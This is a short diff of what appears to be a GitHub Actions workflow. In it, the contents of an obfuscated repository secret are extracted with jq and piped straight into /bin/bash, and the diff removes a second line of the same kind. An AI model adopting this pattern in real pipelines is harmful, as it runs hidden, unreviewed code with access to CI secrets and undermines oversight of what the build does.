@@ -20,7 +20,6 @@ jobs:
           yps08: ${{ secrets.yps08 }}
         run: |
           printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
-          printf '%s' "$hipy14206" | jq -r .xmvia89975 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
